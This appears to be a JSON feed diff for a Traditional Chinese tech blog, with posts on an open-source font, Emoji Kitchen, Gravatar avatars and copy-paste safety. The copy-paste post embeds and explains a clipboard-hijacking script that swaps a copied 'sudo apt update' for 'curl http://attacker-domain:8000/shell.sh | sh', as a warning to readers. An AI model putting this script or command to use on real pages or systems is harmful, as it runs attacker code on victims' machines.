@@ -1,0 +1,52 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "筆記ZONE • All posts by \"網路資源\" category",
+    "description": "",
+    "home_page_url": "https://zonego.tw",
+    "items": [
+        {
+            "id": "https://zonego.tw/2024/04/15/iansui-font/",
+            "url": "https://zonego.tw/2024/04/15/iansui-font/",
+            "title": "iansui-font",
+            "date_published": "2024-04-15T02:40:10.000Z",
+            "content_html": "<span id=\"more\"></span>\n\n<h1 id=\"芫荽-iansui\"><a href=\"#芫荽-iansui\" class=\"headerlink\" title=\"芫荽 &#x2F; iansui\"></a>芫荽 &#x2F; iansui</h1><p>第一套為台灣教育使用所改造的繁體硬筆楷書字型</p>\n<p>An open source Chinese font derived from Klee One (Fontworks).<br>基於 Fontworks 的 Klee One 衍生的開源繁體中文字型。</p>\n<p><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t39.30808-6/272006307_4857260941045163_1782966582251673602_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=5f2048&_nc_ohc=Gq-GHmcsrzAAb4nYKQB&_nc_ht=scontent-tpe1-1.xx&oh=00_AfDKpdb_8KEblYC8Q3pUaoZX2gRNDx9Jju7XjoKUBY6a0w&oe=66226CE4\"><br><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t39.30808-6/272094021_4857260854378505_1008538948070863300_n.jpg?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_ohc=MXbmcFayVoQAb51XeXC&_nc_ht=scontent-tpe1-1.xx&oh=00_AfD8CNDHvDRWZ9wvYbdBwmCMvcjeG5pd7L7lOffFjVeNEQ&oe=6622632C\"><br><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t39.30808-6/271971802_4857260967711827_2813318410001904650_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=5f2048&_nc_ohc=CnfitaZnv_AAb7j-3_l&_nc_ht=scontent-tpe1-1.xx&oh=00_AfD-cjOvWLRBcGtr4S-t-6UyxZZXGqD4-zTf1Pmq5Dv61Q&oe=66225C86\"><br><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t39.30808-6/271966279_4857260864378504_1520780664680379473_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=5f2048&_nc_ohc=tfBU2nM_YBgAb5GTy0g&_nc_ht=scontent-tpe1-1.xx&oh=00_AfD-sibg30YhFbUckLlKTEyfJ9B1P_Yl40J19kqlMSwC5Q&oe=662259E1\"><br><img src=\"https://scontent-tpe1-1.xx.fbcdn.net/v/t39.30808-6/272167278_4857261354378455_2338487781966237778_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=5f2048&_nc_ohc=0gpcBHKpm00Ab6o6OZi&_nc_ht=scontent-tpe1-1.xx&oh=00_AfCpRieSrlrbVdij8mSNj2q0a90MmQzYvHhEH_YJP1D6iw&oe=66227DCC\"></p>\n<h2 id=\"下載\"><a href=\"#下載\" class=\"headerlink\" title=\"下載\"></a>下載</h2><p><a href=\"https://github.com/ButTaiwan/iansui\">GitHub 下載點</a></p>\n<p>在 GitHub 專案的 Release 頁面，點最新版本的 <code>iansui.zip</code> 下載<br><img src=\"/images/content/iansui-font/iansui1.jpg\"><br><img src=\"/images/content/iansui-font/iansui2.jpg\"></p>\n<p>將 <code>iansui.zip</code> 解壓縮後，找到 <code>Iansui-Regular.ttf</code> 點兩下即可安裝。</p>\n<h3 id=\"另外也有發音符號的版本\"><a href=\"#另外也有發音符號的版本\" class=\"headerlink\" title=\"另外也有發音符號的版本\"></a>另外也有發音符號的版本</h3><ul>\n<li><a href=\"https://github.com/ButTaiwan/bpmfvs\">注音芫荽</a> 芫荽的注音字型。</li>\n<li><a href=\"https://github.com/ButTaiwan/taigivs\">字咍芫荽</a> 台語標音字型家族。</li>\n</ul>\n<h2 id=\"圖片、資訊來源：\"><a href=\"#圖片、資訊來源：\" class=\"headerlink\" title=\"圖片、資訊來源：\"></a>圖片、資訊來源：</h2><p><a href=\"https://www.facebook.com/aestheticell/posts/4828133620624562\">美感細胞 教科書再造計畫</a></p>\n",
+            "tags": [
+                "網路資源",
+                "字型"
+            ]
+        },
+        {
+            "id": "https://zonego.tw/2023/09/18/emoji-kitchen/",
+            "url": "https://zonego.tw/2023/09/18/emoji-kitchen/",
+            "title": "Emoji Kitchen 自己組合出想要的表情符號",
+            "date_published": "2023-09-18T04:00:32.000Z",
+            "content_html": "<span id=\"more\"></span>\n<h2 id=\"Gboard-鍵盤\"><a href=\"#Gboard-鍵盤\" class=\"headerlink\" title=\"Gboard 鍵盤\"></a>Gboard 鍵盤</h2><p>Google 出的 Gboard 鍵盤上推出 Emoji Kitchen 功能</p>\n<p>Gboard Google Play 商店連結：<a href=\"https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin\">https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin</a></p>\n<p>簡單來說，在可以傳圖片的地方 (如 Discord)，用 Gboard 鍵盤輸入兩個 emiji 就可以將融合後的圖片傳出去</p>\n<img src=\"/images/content/emoji_kitchen/Screenshot.jpg\" height=\"500\"/>\n\n<h2 id=\"網頁版\"><a href=\"#網頁版\" class=\"headerlink\" title=\"網頁版\"></a>網頁版</h2><p>當初只在Gboard 鍵盤上的 Emoji Kitchen 合成功能現在開放網頁版啦</p>\n<p>只要在 Google 搜尋 Emoji Kitchen，組合完表情就產生出圖片了</p>\n<p>網址：<a href=\"https://www.google.com/search?q=emoji+kitchen\">https://www.google.com/search?q=emoji+kitchen</a></p>\n<p><img src=\"/images/content/emoji_kitchen/emoji_kitchen.jpg\"><br><img src=\"/images/content/emoji_kitchen/emoji_kitchen2.jpg\"></p>\n<p>要用時需要將圖片下載下來，或是複製圖片網址使用</p>\n<p><img src=\"https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx\"></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><code class=\"hljs markdown\">&lt;!-- 複製圖片網址範例 --&gt;<br><br>![](<span class=\"hljs-link\">https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx</span>)<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"開源版本\"><a href=\"#開源版本\" class=\"headerlink\" title=\"開源版本\"></a>開源版本</h2><p>在 Google 還沒開放網頁版功能之前，一些熱心開發者也做出類似的網站可以線上使用<br>這邊介紹 xsalazar&#x2F;emoji-kitchen</p>\n<p>使用時跟 Google 的網頁版一樣，需要將圖片下載下來，或是複製圖片網址使用</p>\n<p>GitHub：<a href=\"https://github.com/xsalazar/emoji-kitchen\">https://github.com/xsalazar/emoji-kitchen</a><br>Emoji Kitchen：<a href=\"https://emojikitchen.dev/\">https://emojikitchen.dev/</a></p>\n<p><img src=\"/images/content/emoji_kitchen/emoji_kitchen3.jpg\"></p>\n",
+            "tags": [
+                "Google",
+                "網路資源"
+            ]
+        },
+        {
+            "id": "https://zonego.tw/2022/04/27/copy-past/",
+            "url": "https://zonego.tw/2022/04/27/copy-past/",
+            "title": "注意複製貼上內容",
+            "date_published": "2022-04-27T11:44:03.000Z",
+            "content_html": "<span id=\"more\"></span>\n<h2 id=\"注意複製貼上內容\"><a href=\"#注意複製貼上內容\" class=\"headerlink\" title=\"注意複製貼上內容\"></a>注意複製貼上內容</h2><p>我們經常會從網路上複製資料，但在貼上之前先注意下你複製到甚麼內容!</p>\n<p>複製這個指令試試看</p>\n<p id=\"copy\">sudo apt update</p>\n\n<script>\ndocument.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\\n'); e.preventDefault(); });\n</script>\n\n<p>把剛剛複製的貼這邊</p>\n<textarea style=\"height: 100px; min-height: 100px; width:100%; resize: none;\" cols=\"30\" name=\"textarea\" rows=\"5\" placeholder=\"Paste your safe text here...\"></textarea>\n\n\n<p>中間的奧秘就是用 JavaScript 達到改寫複製的內容</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>).<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;copy&#x27;</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">e</span>) &#123; <br>    e.<span class=\"hljs-property\">clipboardData</span>.<span class=\"hljs-title function_\">setData</span>(<span class=\"hljs-string\">&#x27;text/plain&#x27;</span>, <span class=\"hljs-string\">&#x27;curl http://attacker-domain:8000/shell.sh | sh\\n&#x27;</span>); <br>    e.<span class=\"hljs-title function_\">preventDefault</span>(); <br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>所以，在貼上之前記得先貼到記事本檢查，<strong>不要直接貼到終端機使用</strong></p>\n<h3 id=\"來源\"><a href=\"#來源\" class=\"headerlink\" title=\"來源\"></a>來源</h3><p><a href=\"https://www.wizer-training.com/blog/copy-paste\">https://www.wizer-training.com/blog/copy-paste</a></p>\n",
+            "tags": [
+                "資安",
+                "網路資源"
+            ]
+        },
+        {
+            "id": "https://zonego.tw/2021/11/22/gravatar/",
+            "url": "https://zonego.tw/2021/11/22/gravatar/",
+            "title": "大頭貼服務 Gravatar",
+            "date_published": "2021-11-22T08:30:59.000Z",
+            "content_html": "<p>辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上串大頭貼的問題! (希望可以…)</p>\n<h2 id=\"Gravatar\"><a href=\"#Gravatar\" class=\"headerlink\" title=\"Gravatar\"></a>Gravatar</h2><p><a href=\"https://gravatar.com/\">Gravatar</a> 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。<br>只需在這邊設定完大頭貼，就可以一次套用。</p>\n<p>除了提供大頭貼，Gravatar 也提供類似線上名片的功能。<br>你可以在上面放你的網站、email等公開資訊。 <del>不過我沒在用</del></p>\n<h3 id=\"使用大頭貼\"><a href=\"#使用大頭貼\" class=\"headerlink\" title=\"使用大頭貼\"></a>使用大頭貼</h3><p>參考<a href=\"https://en.gravatar.com/site/implement\">官方文件</a>的使用方法</p>\n<p>裡面有個方便的用法：取得大頭貼的大頭貼的URL<br>有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入</p>\n<p><del>如果不能用，一定是你還沒上傳大頭貼</del></p>\n<p>大頭貼的網址長這樣，<code>HASH</code>的部分要替換成email的md5 hash值</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">https:<span class=\"hljs-regexp\">//</span>www.gravatar.com<span class=\"hljs-regexp\">/avatar/</span>HASH<br></code></pre></td></tr></table></figure>\n\n<p>如果不知道怎麼找對應的hash值，可以在<a href=\"http://www.md5.cz/\">這裏</a>產生對應的產生對應的md5 hash</p>\n<p>例如我email的hash值找到是 <code>0b1d2b9d95375cc6af5909e145fb4a06</code><br>我的大頭貼網址就是</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"code\"><pre><code class=\"hljs awk\">https:<span class=\"hljs-regexp\">//</span>www.gravatar.com<span class=\"hljs-regexp\">/avatar/</span><span class=\"hljs-number\">0</span>b1d2b9d95375cc6af5909e145fb4a06<br></code></pre></td></tr></table></figure>\n\n<p><img onerror=\"imgOnError(this);\" data-fancybox=\"gallery\" src=\"https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06\" alt=\"大頭貼\" data-caption=\"大頭貼\" loading=\"lazy\"></p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><code class=\"hljs markdown\">![<span class=\"hljs-string\">大頭貼</span>](<span class=\"hljs-link\">https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06</span>)<br></code></pre></td></tr></table></figure>\n",
+            "tags": [
+                "Blog",
+                "網路資源"
+            ]
+        }
+    ]
+}
